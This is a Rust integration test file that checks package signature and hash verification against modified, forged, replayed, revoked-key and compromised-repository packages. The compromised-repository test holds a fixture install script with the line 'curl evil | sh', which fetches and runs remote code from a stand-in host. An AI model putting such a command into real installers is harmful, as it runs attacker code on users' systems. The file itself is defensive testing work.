//! CR-4 — Supply Chain Protection: integration tests.
//!
//! Internal Security Hardening and Pre-Audit Remediation.
//!
//! A package is a set of files plus a signed MANIFEST (path -> sha256). Before
//! executing anything, the installer (modelled by `install_check` below) first
//! verifies the signed manifest against a pre-distributed trust anchor (rejecting
//! unknown/revoked signers and replayed packages), then verifies every file's
//! actual content hash matches the signed manifest. Required validation: modified
//! package, forged package, replayed package, revoked signing key, and a
//! compromised-repository simulation.

use std::collections::HashMap;

use sha2::{Digest, Sha256};
use syntriass_overlay::airgap::{AirgapError, BundleKind, SignedBundle, TrustStore};
use syntriass_overlay::identity::{HybridSigner, SoftwareSigner};

fn file_hash(content: &[u8]) -> [u8; 32] {
    let mut h = Sha256::new();
    h.update(content);
    h.finalize().into()
}

/// Build a manifest payload: lines of `path\t<hex sha256>`.
fn build_manifest(files: &HashMap<&str, Vec<u8>>) -> Vec<u8> {
    let mut paths: Vec<&&str> = files.keys().collect();
    paths.sort();
    let mut m = Vec::new();
    for p in paths {
        let hex = file_hash(&files[*p])
            .iter()
            .map(|b| format!("{b:02x}"))
            .collect::<String>();
        m.extend_from_slice(format!("{p}\t{hex}\n").as_bytes());
    }
    m
}

/// The installer's pre-execution gate. Returns Ok only if the manifest signature
/// verifies AND every delivered file matches its signed hash.
fn install_check(
    trust: &TrustStore,
    bundle: &SignedBundle,
    delivered: &HashMap<&str, Vec<u8>>,
) -> Result<(), String> {
    // 1) authenticate the manifest (signature, signer, replay).
    trust
        .verify(bundle)
        .map_err(|e| format!("manifest: {e:?}"))?;
    // 2) every signed entry must match a delivered file's actual hash.
    let manifest = String::from_utf8(bundle.payload.clone()).map_err(|_| "bad manifest")?;
    for line in manifest.lines() {
        let (path, hex) = line.split_once('\t').ok_or("bad manifest line")?;
        let content = delivered.get(path).ok_or(format!("missing file {path}"))?;
        let actual = file_hash(content)
            .iter()
            .map(|b| format!("{b:02x}"))
            .collect::<String>();
        if actual != hex {
            return Err(format!("file {path} hash mismatch (tampered)"));
        }
    }
    Ok(())
}

fn pkg() -> HashMap<&'static str, Vec<u8>> {
    let mut f = HashMap::new();
    f.insert("bin/daemon", b"ELF...legit-daemon".to_vec());
    f.insert("bin/install.sh", b"#!/bin/sh\nlegit installer".to_vec());
    f
}

fn anchored_signer() -> (SoftwareSigner, TrustStore) {
    let s = SoftwareSigner::generate();
    let mut t = TrustStore::new();
    t.add_anchor(&s.ed25519_public(), &s.mldsa65_public());
    (s, t)
}

#[test]
fn legitimate_package_installs() {
    let (s, t) = anchored_signer();
    let files = pkg();
    let manifest = build_manifest(&files);
    let bundle = SignedBundle::sign(BundleKind::Package, &s, 1, manifest).unwrap();
    assert!(install_check(&t, &bundle, &files).is_ok());
}

#[test]
fn modified_package_is_rejected() {
    // Attacker swaps the daemon binary AFTER the manifest was signed.
    let (s, t) = anchored_signer();
    let files = pkg();
    let manifest = build_manifest(&files);
    let bundle = SignedBundle::sign(BundleKind::Package, &s, 1, manifest).unwrap();
    let mut tampered = files.clone();
    tampered.insert("bin/daemon", b"ELF...TROJAN".to_vec());
    let err = install_check(&t, &bundle, &tampered).unwrap_err();
    assert!(err.contains("hash mismatch"), "got: {err}");
}

#[test]
fn forged_package_is_rejected() {
    // Attacker rebuilds the manifest for their trojan and signs with THEIR key.
    let (_legit, t) = anchored_signer();
    let attacker = SoftwareSigner::generate();
    let mut trojan = pkg();
    trojan.insert("bin/daemon", b"ELF...TROJAN".to_vec());
    let manifest = build_manifest(&trojan);
    let bundle = SignedBundle::sign(BundleKind::Package, &attacker, 1, manifest).unwrap();
    let err = install_check(&t, &bundle, &trojan).unwrap_err();
    assert!(err.contains("UnknownSigner"), "got: {err}");
}

#[test]
fn replayed_package_is_rejected() {
    // A previously-valid OLD package is replayed after a newer one was installed
    // (e.g. to reintroduce a since-patched vulnerability).
    let (s, mut t) = anchored_signer();
    let files = pkg();
    let new = SignedBundle::sign(BundleKind::Package, &s, 7, build_manifest(&files)).unwrap();
    let old = SignedBundle::sign(BundleKind::Package, &s, 2, build_manifest(&files)).unwrap();
    assert_eq!(t.accept(&new), Ok(()));
    let err = install_check(&t, &old, &files).unwrap_err();
    assert!(err.contains("Replayed"), "got: {err}");
}

#[test]
fn revoked_signing_key_is_rejected() {
    let (s, mut t) = anchored_signer();
    let files = pkg();
    let bundle = SignedBundle::sign(BundleKind::Package, &s, 1, build_manifest(&files)).unwrap();
    assert!(install_check(&t, &bundle, &files).is_ok());
    t.revoke(&bundle.signer);
    let err = install_check(&t, &bundle, &files).unwrap_err();
    assert!(err.contains("RevokedSigner"), "got: {err}");
}

#[test]
fn compromised_repository_simulation() {
    // The repo is compromised: the attacker serves a package whose manifest is
    // re-signed with the attacker's key (they cannot use the legit signer's key).
    // Even though every file matches the attacker's manifest, the unknown signer
    // is rejected before any file is trusted.
    let (_legit, t) = anchored_signer();
    let attacker = SoftwareSigner::generate();
    let mut malicious = pkg();
    malicious.insert("bin/install.sh", b"#!/bin/sh\ncurl evil | sh".to_vec());
    let bundle = SignedBundle::sign(
        BundleKind::Package,
        &attacker,
        99,
        build_manifest(&malicious),
    )
    .unwrap();
    // Round-trip through the on-disk format too (what the repo actually serves).
    let parsed = SignedBundle::from_bytes(&bundle.to_bytes()).unwrap();
    assert_eq!(t.verify(&parsed), Err(AirgapError::UnknownSigner));
    assert!(install_check(&t, &parsed, &malicious).is_err());
}
